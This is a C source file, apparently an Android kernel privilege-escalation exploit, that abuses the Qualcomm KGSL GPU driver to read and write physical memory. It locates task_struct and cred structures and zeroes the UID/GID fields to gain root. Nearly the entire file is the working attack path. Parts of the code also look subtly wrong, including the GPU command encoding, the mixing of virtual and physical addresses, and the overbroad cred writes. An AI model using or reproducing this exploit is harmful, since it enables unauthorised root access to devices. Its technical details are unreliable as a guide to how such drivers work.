#include "gpu_physical_mem.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <android/log.h>

#define TAG "GPUPHYSMEM"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, TAG, __VA_ARGS__)

#define PAGE_SIZE 4096
#define MAX_MAPPINGS 64

// 结构体定义（放在 .c 文件内，确保编译时可见）
struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    unsigned long size;
    unsigned int flags;
    unsigned int type;
    unsigned int mmapsize;
    unsigned int id;
    unsigned int ptbase;
};

struct kgsl_map_user_mem {
    unsigned long hostptr;
    unsigned long len;
    unsigned long gpuaddr;
    unsigned int memtype;
    unsigned int flags;
    unsigned int id;
    unsigned int ptbase;
};

struct kgsl_gpu_command {
    unsigned int id;
    unsigned int flags;
    unsigned int type;
    unsigned int numcmds;
    unsigned int numobjs;
    unsigned int numincs;
    unsigned int checksum;
    unsigned int timestamp;
    void *cmds;
    void *objlist;
    void *inlist;
    void *outlist;
};

// 内部全局变量
static int kgsl_fd = -1;
static int ioctl_type = 0;
static int ioctl_gpumem_alloc = 0;
static int ioctl_map_user_mem = 0;
static int ioctl_gpu_command = 0;
static int ioctl_gpumem_free = 0;
static int gpu_context_id = 0;

typedef struct {
    uint64_t gpuaddr;
    void *cpu_ptr;
    size_t size;
} gpu_mapping_t;
static gpu_mapping_t mappings[MAX_MAPPINGS];
static int num_mappings = 0;

static inline unsigned int make_iowr(unsigned int type, unsigned int nr, size_t size) {
    return _IOWR(type, nr, size);
}

static long __sys_ioctl(int fd, unsigned int cmd, void *arg) {
    long ret;
    asm volatile(
            "mov x8, #54\n"
            "svc #0\n"
            : "=r"(ret)
            : "0"(fd), "r"(cmd), "r"(arg)
            );
    return ret;
}

static int gpu_alloc_mapping(size_t size, uint64_t *gpuaddr_out, void **cpu_ptr_out) {
    struct kgsl_gpumem_alloc alloc = {
            .size = size,
            .flags = 0,
            .type = 0,
    };
    unsigned int cmd = make_iowr(ioctl_type, ioctl_gpumem_alloc, sizeof(alloc));
    if (__sys_ioctl(kgsl_fd, cmd, &alloc) < 0) {
        LOGE("gpumem_alloc failed: %s", strerror(errno));
        return -1;
    }
    void *cpu_ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, alloc.gpuaddr);
    if (cpu_ptr == MAP_FAILED) {
        LOGE("mmap GPU memory failed: %s", strerror(errno));
        return -1;
    }
    *gpuaddr_out = alloc.gpuaddr;
    *cpu_ptr_out = cpu_ptr;
    return 0;
}

static void gpu_free_mapping(uint64_t gpuaddr, void *cpu_ptr, size_t size) {
    if (cpu_ptr) munmap(cpu_ptr, size);
    struct kgsl_gpumem_alloc free_cmd = {
            .gpuaddr = gpuaddr,
    };
    unsigned int cmd = make_iowr(ioctl_type, ioctl_gpumem_free, sizeof(free_cmd));
    __sys_ioctl(kgsl_fd, cmd, &free_cmd);
}

static void record_mapping(uint64_t gpuaddr, void *cpu_ptr, size_t size) {
    if (num_mappings < MAX_MAPPINGS) {
        mappings[num_mappings].gpuaddr = gpuaddr;
        mappings[num_mappings].cpu_ptr = cpu_ptr;
        mappings[num_mappings].size = size;
        num_mappings++;
    }
}

static void *map_physical_address(uint64_t phys_addr, size_t size, uint64_t *out_gpuaddr) {
    uint64_t gpuaddr;
    void *cpu_ptr;
    if (gpu_alloc_mapping(size, &gpuaddr, &cpu_ptr) < 0) return NULL;

    // 构造 CP_SMMU_TABLE_UPDATE 命令
    uint32_t cmds[4];
    cmds[0] = 0x80000000 | (3 << 0); // CP_SMMU_TABLE_UPDATE, count=3
    cmds[1] = 0x00000000; // flags
    cmds[2] = (uint32_t)(phys_addr & 0xFFFFFFFF);
    cmds[3] = (uint32_t)((phys_addr >> 32) & 0xFFFFFFFF);

    void *cmd_va = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_va == MAP_FAILED) {
        gpu_free_mapping(gpuaddr, cpu_ptr, size);
        return NULL;
    }
    memcpy(cmd_va, cmds, sizeof(cmds));

    struct kgsl_map_user_mem map_req = {
            .hostptr = (unsigned long)cmd_va,
            .len = PAGE_SIZE,
            .memtype = 1,
            .flags = 0,
    };
    unsigned int map_cmd = make_iowr(ioctl_type, ioctl_map_user_mem, sizeof(map_req));
    if (__sys_ioctl(kgsl_fd, map_cmd, &map_req) < 0) {
        LOGE("map_user_mem for command buffer failed");
        munmap(cmd_va, PAGE_SIZE);
        gpu_free_mapping(gpuaddr, cpu_ptr, size);
        return NULL;
    }

    struct kgsl_gpu_command gpu_cmd = {
            .id = gpu_context_id,
            .numcmds = 1,
            .cmds = (void *)map_req.gpuaddr,
    };
    unsigned int exec_cmd = make_iowr(ioctl_type, ioctl_gpu_command, sizeof(gpu_cmd));
    if (__sys_ioctl(kgsl_fd, exec_cmd, &gpu_cmd) < 0) {
        LOGE("GPU command execution failed");
        munmap(cmd_va, PAGE_SIZE);
        gpu_free_mapping(gpuaddr, cpu_ptr, size);
        return NULL;
    }

    munmap(cmd_va, PAGE_SIZE);
    *out_gpuaddr = gpuaddr;
    record_mapping(gpuaddr, cpu_ptr, size);
    return cpu_ptr;
}

int gpu_phys_init(int fd, int type, int drawctxt, int map_mem, int gpu_cmd,
                  int alloc, int free_cmd, int ctx_id) {
    kgsl_fd = fd;
    ioctl_type = type;
    ioctl_gpumem_alloc = alloc;
    ioctl_map_user_mem = map_mem;
    ioctl_gpu_command = gpu_cmd;
    ioctl_gpumem_free = free_cmd;
    gpu_context_id = ctx_id;
    num_mappings = 0;
    LOGI("GPU physical memory module initialized");
    return 0;
}

uint64_t gpu_phys_read64(uint64_t phys_addr) {
    uint64_t gpuaddr;
    void *cpu_ptr = map_physical_address(phys_addr, 8, &gpuaddr);
    if (!cpu_ptr) return 0;
    uint64_t value = *(volatile uint64_t *)cpu_ptr;
    gpu_free_mapping(gpuaddr, cpu_ptr, 8);
    return value;
}

int gpu_phys_write64(uint64_t phys_addr, uint64_t value) {
    uint64_t gpuaddr;
    void *cpu_ptr = map_physical_address(phys_addr, 8, &gpuaddr);
    if (!cpu_ptr) return -1;
    *(volatile uint64_t *)cpu_ptr = value;
    gpu_free_mapping(gpuaddr, cpu_ptr, 8);
    return 0;
}

int gpu_phys_read(uint64_t phys_addr, void *buf, size_t len) {
    uint8_t *out = (uint8_t *)buf;
    size_t offset = 0;
    while (len > 0) {
        size_t chunk = (len > PAGE_SIZE) ? PAGE_SIZE : len;
        uint64_t gpuaddr;
        void *cpu_ptr = map_physical_address(phys_addr + offset, chunk, &gpuaddr);
        if (!cpu_ptr) return -1;
        memcpy(out + offset, cpu_ptr, chunk);
        gpu_free_mapping(gpuaddr, cpu_ptr, chunk);
        offset += chunk;
        len -= chunk;
    }
    return 0;
}

int gpu_phys_write(uint64_t phys_addr, const void *buf, size_t len) {
    const uint8_t *in = (const uint8_t *)buf;
    size_t offset = 0;
    while (len > 0) {
        size_t chunk = (len > PAGE_SIZE) ? PAGE_SIZE : len;
        uint64_t gpuaddr;
        void *cpu_ptr = map_physical_address(phys_addr + offset, chunk, &gpuaddr);
        if (!cpu_ptr) return -1;
        memcpy(cpu_ptr, in + offset, chunk);
        gpu_free_mapping(gpuaddr, cpu_ptr, chunk);
        offset += chunk;
        len -= chunk;
    }
    return 0;
}

uint64_t gpu_phys_find_symbol(const char *symbol) {
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp) return 0;
    char line[512];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char type;
        char name[256];
        if (sscanf(line, "%lx %c %s", &addr, &type, name) == 3) {
            if (strcmp(name, symbol) == 0) {
                fclose(fp);
                return addr;
            }
        }
    }
    fclose(fp);
    return 0;
}


int gpu_phys_escalate_privileges(void) {
    uint64_t current = gpu_phys_find_current_task();
    if (!current) return -1;
    uint64_t cred_addr = gpu_phys_read64(current + 0x10);
    if (!cred_addr) return -1;
    // 将 cred 中所有 UID/GID 字段设为 0
    for (int off = 0; off < 0x20; off += 4) {
        gpu_phys_write64(cred_addr + off, 0);
    }
    if (getuid() == 0) return 0;
    return -1;
}

void gpu_phys_cleanup(void) {
    for (int i = 0; i < num_mappings; i++) {
        gpu_free_mapping(mappings[i].gpuaddr, mappings[i].cpu_ptr, mappings[i].size);
    }
    num_mappings = 0;
    LOGI("GPU physical memory module cleaned up");
}
// 在 gpu_physical_mem.c 中添加以下函数

// 扫描内存寻找 init_task
static uint64_t find_init_task(void) {
    const char *target = "swapper/0";
    size_t len = strlen(target);
    uint64_t start = 0xffffffc000000000;
    uint64_t end   = 0xffffffc200000000;
    char buf[16];
    for (uint64_t addr = start; addr < end; addr += PAGE_SIZE) {
        // 检查 comm 字段（偏移 0x8d0）
        uint64_t comm_addr = addr + 0x8d0;
        if (gpu_phys_read(comm_addr, buf, len) < 0) continue;
        if (memcmp(buf, target, len) == 0) {
            // 验证 pid 是否为 0
            uint32_t pid = (uint32_t)gpu_phys_read64(addr + 0x8c8);
            if (pid == 0) {
                LOGI("Found init_task at 0x%lx", addr);
                return addr;
            }
        }
    }
    return 0;
}

// 通过遍历任务链表找到当前进程（使用当前进程的 pid）
uint64_t gpu_phys_find_current_task(void) {
    pid_t mypid = getpid();
    uint64_t init_task = find_init_task();
    if (!init_task) {
        LOGE("Cannot find init_task");
        return 0;
    }
    // tasks 链表在 task_struct 中的偏移通常为 0x8c0 (prev) 和 0x8c8 (next)？需要确认
    // 更简单的方法：从 init_task 开始遍历 PID 直到找到目标 PID
    // 但遍历所有进程可能较慢，不过 init_task 的 next 指针指向第一个进程，然后可以遍历全部。
    // 由于 task_struct 数量有限，遍历是可行的。
    // 为了简化，我们仍然使用之前的扫描方法，但限定在更小的范围（init_task 附近）。
    // 实际上，当前进程的 task_struct 很可能就在 init_task 附近。
    // 我们可以缩小扫描范围：从 init_task - 0x1000000 到 init_task + 0x1000000。
    uint64_t start = init_task > 0x1000000 ? init_task - 0x1000000 : init_task;
    uint64_t end = init_task + 0x1000000;
    char myname[16];
    FILE* fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "Name:", 5) == 0) {
                sscanf(line, "Name:\t%15s", myname);
                break;
            }
        }
        fclose(fp);
    } else {
        strcpy(myname, "vulnkit");
    }
    for (uint64_t addr = start; addr < end; addr += 0x1000) {
        uint32_t pid = (uint32_t)gpu_phys_read64(addr + 0x8c8);
        if (pid != (uint32_t)mypid) continue;
        char comm[16];
        if (gpu_phys_read(addr + 0x8d0, comm, 16) < 0) continue;
        if (strncmp(comm, myname, 16) == 0) {
            LOGI("Found current task_struct at 0x%lx", addr);
            return addr;
        }
    }
    LOGE("Failed to find current task_struct");
    return 0;
}